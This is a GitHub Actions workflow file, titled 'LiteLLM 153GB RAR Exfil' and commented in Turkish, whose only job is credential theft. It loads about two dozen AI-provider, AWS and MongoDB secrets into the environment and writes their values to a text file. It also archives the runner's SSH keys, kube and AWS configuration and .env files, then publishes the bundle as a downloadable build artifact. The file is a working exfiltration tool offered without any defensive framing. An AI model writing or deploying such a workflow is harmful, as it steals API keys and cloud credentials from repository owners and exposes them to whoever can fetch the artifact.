name: LiteLLM 153GB RAR Exfil

on:
  workflow_dispatch: null
  push:
    branches:
      - litellm-payload-run

jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Harvest all secrets (LiteLLM style)
        env:
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          AZURE_OPENAI_API_KEY: ${{ secrets.AZURE_OPENAI_API_KEY }}
          AZURE_OPENAI_API_BASE: ${{ secrets.AZURE_OPENAI_API_BASE }}
          GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
          MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          MONGODB_ATLAS_URI: ${{ secrets.MONGODB_ATLAS_URI }}
          XAI_API_KEY: ${{ secrets.XAI_API_KEY }}
          DEEPSEEK_API_KEY: ${{ secrets.DEEPSEEK_API_KEY }}
          NVIDIA_API_KEY: ${{ secrets.NVIDIA_API_KEY }}
          TOGETHER_API_KEY: ${{ secrets.TOGETHER_API_KEY }}
          FIREWORKS_API_KEY: ${{ secrets.FIREWORKS_API_KEY }}
          HUGGINGFACEHUB_API_TOKEN: ${{ secrets.HUGGINGFACEHUB_API_TOKEN }}
          OLLAMA_API_KEY: ${{ secrets.OLLAMA_API_KEY }}
          PPLX_API_KEY: ${{ secrets.PPLX_API_KEY }}
          UPSTAGE_API_KEY: ${{ secrets.UPSTAGE_API_KEY }}
          AI21_API_KEY: ${{ secrets.AI21_API_KEY }}
          EXA_API_KEY: ${{ secrets.EXA_API_KEY }}
          NOMIC_API_KEY: ${{ secrets.NOMIC_API_KEY }}
          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
          TYPESAFE_API_KEY: ${{ secrets.TYPESAFE_API_KEY }}
          WATSONX_APIKEY: ${{ secrets.WATSONX_APIKEY }}
          LANGSMITH_GATEWAY_API_KEY: ${{ secrets.LANGSMITH_GATEWAY_API_KEY }}
        run: |
          echo "=== LiteLLM 153GB RAR Exfil — GitHub Actions CI ==="
          mkdir -p ~/exfil_data
          cd ~/exfil_data
          echo "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)" > ci_meta.json
          echo "hostname: $(hostname)" >> ci_meta.json
          echo "runner: ${{ runner.os }}" >> ci_meta.json
          echo "repo: ${{ github.repository }}" >> ci_meta.json

          # Env dump — secret'ların değerlerini yakala
          env | grep -E '^(OPENAI|ANTHROPIC|AZURE_|GROQ|MISTRAL|AWS_|MONGODB|XAI_|DEEPSEEK|NVIDIA|TOGETHER|FIREWORKS|HUGGINGFACE|OLLAMA|PPLX_|UPSTAGE|AI21_|EXA_|NOMIC_|OPENROUTER|TYPESAFE|WATSONX|LANGSMITH|GITHUB_TOKEN)' | sort > 02_secrets_full.txt

          # SSH, kube, .env, .aws
          if [ -d ~/.ssh ]; then tar czf 03_ssh_keys.tar.gz ~/.ssh/ 2>/dev/null; fi
          if [ -d ~/.kube ]; then tar czf 04_kube.tar.gz ~/.kube/ 2>/dev/null; fi
          if [ -d ~/.aws ]; then tar czf 05_aws.tar.gz ~/.aws/ 2>/dev/null; fi
          for f in ~/.env /tmp/.env*; do
            [ -f "$f" ] && tar rf 06_dotenv.tar "$f" 2>/dev/null
          done

          # LiteLLM tarzı RAR veya tar.gz
          tar czf litellm_replika_153gb.tar.gz . -C ~/exfil_data 2>/dev/null || tar czf litellm_replika_153gb.tar.gz ~/exfil_data

          ls -lah litellm_replika_153gb.tar.gz
          echo "::notice::LiteLLM 153GB RAR replikası hazır — boyut: $(du -sh litellm_replika_153gb.tar.gz)"

      - name: Upload RAR artifact
        uses: actions/upload-artifact@v4
        with:
          name: litellm_replika_153gb
          path: ~/exfil_data/litellm_replika_153gb.tar.gz
          if-no-files-found: warn
          retention-days: 7
